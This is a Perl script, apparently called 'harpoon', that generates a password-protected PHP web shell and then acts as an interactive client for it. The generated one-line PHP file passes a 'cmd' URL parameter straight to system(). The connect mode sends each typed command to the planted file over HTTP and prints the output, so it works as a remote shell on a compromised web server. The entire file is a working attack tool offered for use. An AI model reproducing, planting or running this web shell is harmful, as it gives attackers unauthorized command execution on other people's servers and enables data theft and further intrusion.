#!/usr/bin/perl

use WWW::Mechanize;

my $command = $ARGV[0];

sub help {
	print "\nTo Create: perl harpoon.pl create <name> <password>
	\rExample: perl harpoon.pl create harpoon.php inploitSecurity
	\rTo connect: perl harpoon.pl connect <link> <password>
	\rExample: perl harpoon.pl connect htpp://inploit.com/harpoon.php inploitSecurity\n\n";
	exit;
}

if (!$command) { return help(); }

if ( ($command eq "-h") || ($command eq "--help") ) { return help(); }

elsif ($command eq "create") {


	my $name = $ARGV[1];
	my $pass = $ARGV[2];

	if ( (!$pass) || (!$name) ) {
		print "\nFollow the example: ./harpoon.pl create harpoon.php inploitSecurity\n\n";
		exit;
	}

	open ( my $webshell, ">$name");
	print $webshell "<?php (\$_GET['pass'] == '$pass') ? NULL : exit; system(\$_GET[cmd]); ?>";
	close $webshell;
	print "\nCreated file $name with password $pass.\n";
	exit;
}

elsif ($command eq "connect") {
	
	my $link = $ARGV[1];
	my $pass = $ARGV[2];

	if ( (!$link) || (!$pass) ) {
		print "\nFollow the example: ./harpoon.pl connect https://inploit.com/harpoon.php inploitSecurity\n\n";
		exit;
	}

	my $mech = new WWW::Mechanize;

	if ( $link !~ /^http:/ ) {
    	$link = 'http://' . $link;
    }

	my $whoami   = "$link?pass=$pass&cmd=whoami";
	my $hostname = "$link?pass=$pass&cmd=hostname";
	my $pwd      = "$link?pass=$pass&cmd=pwd";

	$mech -> get ($whoami);
	$whoami = $mech -> content(format => 'text');
	$whoami =~ s/ // ;

	$mech -> get ($hostname);
	$hostname = $mech -> content(format => 'text');
	$hostname =~ s/ // ;

	$mech -> get ($pwd);
	$pwd = $mech -> content(format => 'text');
	$pwd =~ s/ // ;

	

	while ( 1 == 1 ) { 

		print "\n$whoami\@$hostname:$pwd\$ ";
		chomp ( my $htr = <STDIN> );

		my $harpoon = $link . "?pass=$pass" . "&cmd=" . $htr; 
		
		$mech -> get ($harpoon);
		my $result = $mech -> content(format => 'text');

		print $result;
	}
}

else { return help(); }

exit;